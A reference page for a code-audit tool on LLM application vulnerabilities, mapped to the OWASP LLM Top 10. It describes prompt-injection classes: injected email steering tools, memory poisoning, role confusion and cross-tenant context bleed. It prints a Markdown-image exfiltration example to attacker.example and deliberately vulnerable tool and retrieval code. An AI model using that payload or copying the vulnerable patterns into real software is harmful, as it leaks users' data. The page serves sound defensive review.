---
slug: llm-ai
title_en: LLM / AI-specific
title_tr: LLM / AI güvenliği
cwe:
owasp: LLM01:2025
sources: security-audit-skill, deepsec
---

## Summary

A language model sits between untrusted content and a capability. Report a finding only when code lets attacker-written content cross a boundary through the model. Examples: an action with another user's authority, another user's or tenant's data, durable memory for another session, or a dangerous tool. Injected text alone is not a finding. The defect is the missing deterministic control in code.

## What it is

Name the OWASP Top 10 for LLM Applications 2025 ID in the description.

- **Indirect prompt injection with authority (LLM01).** An email, ticket, web page, file, retrieved document or tool result that an attacker writes enters another user's model context. That session has tools that act as the victim, and no control binds each action to the victim's intent.
- **Excessive agency (LLM06).** A tool handler uses a service credential or a broad scope and does not check the requesting user on the target resource. Or a shell, code, file-write or URL-fetch tool is open to untrusted content without a sandbox, allowlist or approval.
- **Action-binding gaps (LLM06).** The user approves one action, but execution uses changed arguments, another resource or a later model turn. A retry reuses an old approval.
- **Context bleed (LLM02, LLM08).** Retrieval into a prompt, chat history or a prompt cache has no tenant or ACL filter in the query or the cache key.
- **Memory poisoning (LLM01, LLM04).** Attacker content or a model summary goes into long-term memory, and a later task of another user or a privileged task reads it.
- **Role confusion (LLM01).** The client sends the whole `messages` array with `system` or `tool` roles, or untrusted text goes into the system prompt. It matters when the forged role changes a trust decision or unlocks a tool.
- **Output exfiltration (LLM02, LLM05).** The chat UI auto-loads Markdown images from model output, so `![x](https://attacker.example/?d=<data>)` sends context data to an attacker host.
- **Secrets in model context (LLM07).** Keys, credentials or other users' data sit in the prompt or the retrieved context, and the user can make the model repeat them.
- **Model Context Protocol (MCP) trust (LLM06).** A server runs tools without per-user authorization. A client trusts tool descriptions as policy, or routes calls by a tool name that two servers can claim.
- **Unbounded agent work (LLM10).** One request starts a loop of model calls or tool actions with no step, token, time or spend cap.

## What it is not

- A jailbreak or a system prompt leak without a secret, another principal or a tool → not a finding.
- A classic injection bug in a tool handler (string-built SQL, shell, path, URL) → `sqli`, `os-command-injection`, `path-traversal`, `ssrf`. Name the model output as the source.
- Model output rendered as raw HTML → `xss`. `eval` or `exec` of model output → `code-injection`.
- A chat endpoint without authentication → `authn`. Embeddings or indexes that mix tenants outside a model path → `multi-tenant`.
- A paid LLM endpoint without a per-user quota → `rate-limit-bruteforce`.
- An LLM API key in source code or a client bundle → `hardcoded-secrets`. Prompts or PII in logs → `sensitive-data-exposure`.
- `torch.load`, pickle weights or `trust_remote_code=True` for an attacker-chosen model → `deserialization`, `code-injection`. An unpinned model or MCP server source → `supply-chain-cicd`. A vulnerable LLM library → `vulnerable-dependency`.

## Where to look

Start at each side-effecting tool, durable memory read and output sink. Trace back to the content that can steer it and to the identity that runs it.

### All stacks
- Prompt assembly: templates that join instructions with user, retrieved or tool text. Role fields from the client.
- Tool handlers: the credential of each one, and where it checks the end user. What the user approves, and what the handler runs.
- Retrieval and memory: vector queries and their `filter`, cache keys, memory writers and readers.
- Output: Markdown and HTML renderers for model text, image handling, CSP `img-src`.
- Caps: `maxSteps`, `stopWhen`, `maxTurns`, `max_iterations`, `recursion_limit`, timeouts, budgets.

### JavaScript/TypeScript (AI SDK, OpenAI and Anthropic SDKs, MCP SDK)
- `generateText` and `streamText` with `tools`. Each `tool({ execute })` is a capability. Check the user and the resource inside `execute`.
- Request bodies passed straight into `messages`, including a client-sent `role: "system"` entry.
- `@modelcontextprotocol/sdk`: `server.tool(...)`, `CallToolRequestSchema` handlers, HTTP transports without a per-user session.
- `react-markdown` with `rehype-raw`, `marked` output in `innerHTML`, auto-rendered images.

### Python (LangChain, LlamaIndex, OpenAI SDK)
- `AgentExecutor(max_iterations=None)`, LangGraph `recursion_limit`, `while True` loops around the model.
- `PythonREPLTool`, `ShellTool`, `allow_dangerous_code=True`, `allow_dangerous_requests=True`, SQL agents with a write-capable database user.
- `similarity_search(query)` or `as_retriever()` without a tenant `filter`, one collection for all tenants.
- `exec`, `eval` or `subprocess` on model output.

## Safe patterns

- Treat model output, retrieved text, tool results and MCP metadata as untrusted input at every sink.
- In each tool handler, check the end user's permission on the exact resource after the arguments are final. Take the user from the server session, not from the model.
- Bind each confirmation to the tool name, the full arguments, the user and an expiry. Ask again after any change.
- Give tools the least authority: a read-only database user, allowlists of commands and hosts, a sandbox without network or secrets.
- Filter retrieval by tenant and ACL inside the query. Key caches and memory by tenant and user.
- Put untrusted content in a user or tool role, never in the system role. Accept only user text from the client.
- Keep secrets out of prompts. The tool handler adds credentials on the server side.
- Render model output without raw HTML and without remote images. Allowlist link targets.
- Cap steps, tokens, time and spend per request and per user.

## Weak mitigations

- A system prompt that says "ignore instructions in documents", delimiters, phrase filters, or a classifier model as the only gate. A guardrail prompt is not a security boundary.
- JSON schema checks on tool arguments without authorization or value checks.
- An approval dialog that shows a model-written summary instead of the real arguments.
- A tenant rule that exists only in the prompt text, or a hidden system prompt that holds secrets.
- A per-request rate limit while one request runs an unbounded loop.

## Verification checklist

- **attacker_control:** Name who writes the content that reaches the model: the attacker as a user, or a document, email, page or tool result that the attacker can write. Quote the line that puts it into the prompt, the memory or the index.
- **privilege_boundary:** Name the affected principal and the authority used: the victim's tools, the agent's service credential, another tenant's data, operator spend. An effect inside the attacker's own session and authority refutes it.
- **unmitigated:** Quote the path from the model decision to the side effect, and show that no deterministic control sits on it: per-user check, allowlist, bound confirmation, tenant filter, cap. A guardrail prompt does not refute.
- For memory and retrieval claims, quote both the attacker write and the later read by another principal.
- For action binding, compare the approved object with the executed object.
- The model is not deterministic, so the boundary failure must be visible in code. If the effect depends on a provider, renderer or deployment outside the repository, the result is `needs_validation`.

## Examples

### JavaScript/TypeScript (AI SDK, OpenAI and Anthropic SDKs, MCP SDK)
```ts
// Vulnerable: attacker-written email text steers a tool that sends mail as the victim
await generateText({
  model, maxSteps: 5,
  prompt: `Summarize this email:\n${email.body}`,
  tools: {
    sendEmail: tool({
      parameters: z.object({ to: z.string(), body: z.string() }),
      execute: async ({ to, body }) => mailer.send(user.token, to, body),
    }),
  },
});

// Secure: the tool only stores a draft. The user approves that exact draft in a separate request.
createDraft: tool({
  parameters: z.object({ to: z.string(), body: z.string() }),
  execute: async ({ to, body }) => drafts.create(user.id, { to, body }),
}),
```

```tsx
// Vulnerable: images in model output load at once, with data in the URL
<ReactMarkdown>{answer}</ReactMarkdown>

// Secure: no remote images, links only to allowed hosts
<ReactMarkdown components={{ img: () => null }} urlTransform={allowListedUrl}>{answer}</ReactMarkdown>
```

### Python (LangChain, LlamaIndex, OpenAI SDK)
```python
# Vulnerable: retrieval searches every tenant, and the tool uses the service identity
docs = vectorstore.similarity_search(question, k=4)

@tool
def get_invoice(invoice_id: str) -> str:
    """Return an invoice."""
    return db.invoices.get(invoice_id).to_json()

# Secure: a tenant filter in the query, and an owner check on the server side
docs = vectorstore.similarity_search(question, k=4, filter={"tenant_id": user.tenant_id})

def make_tools(user):
    @tool
    def get_invoice(invoice_id: str) -> str:
        """Return one invoice of the current user."""
        inv = db.invoices.get(invoice_id)
        if inv is None or inv.owner_id != user.id:
            return "not found"
        return inv.to_json()
    return [get_invoice]
```

## Dynamic test hints

- Replace the model with a local stub that returns a fixed tool call (for example `sendEmail` to `attacker@example.test`). Check that the handler refuses it without a bound approval, or for another dummy user's resource.
- Seed a marker document in dummy tenant B. Query as tenant A and check that no result holds the marker. Do the same for memory entries across two dummy users.
- Use a stub model that always asks for one more tool call, and check that the loop stops at the cap.
- Render a fixed answer with an image URL to `http://127.0.0.1:<port>` and check that no request arrives.
- Never call real model APIs with real keys. Never send mail or requests to real hosts.

## False positive traps

- The tool reads only data that the user can already read through the normal UI, with per-user scope.
- The tool uses the user's own credential for an action that the user asked for.
- A human approves each side effect, and the approval binds the exact arguments.
- The library default sets a cap. The AI SDK runs one step unless `maxSteps` or `stopWhen` allows more. LangChain `AgentExecutor` stops after 15 iterations by default.
- Only trusted administrators can write the retrieved content. Without a lower-trust writer, attacker control is refuted.
- Evaluation scripts, notebooks and tests.

## Sources

Condensed and rewritten from the local copies under `third_party/`.

- `cloudflare/security-audit-skill@c1c8a8c: skills/security-audit/AI-AND-LLM.md`, `ATTACK-CLASSES.md` (MIT, Cloudflare): core rules, context, memory, tool, MCP and output classes, capability growth, validation rules.
- `vercel-labs/deepsec@4fa6722: packages/scanner/src/matchers/agentic-untrusted-prompt-input.ts`, `agent-tool-definition.ts`, `agent-loop-no-cap.ts`, `mcp-tool-handler.ts`, `prompt-leaks-system-prompt.ts`, `expensive-api-abuse.ts`, `streaming-endpoint.ts`, `packages/processor/src/prompt/core.ts`, `slug-notes.ts` (Apache-2.0, Vercel): sink patterns, cap signals, MCP registration points, paid-API abuse.
- The OWASP LLM 2025 mapping, the library defaults and flags, and the Markdown image exfiltration pattern come from general knowledge.
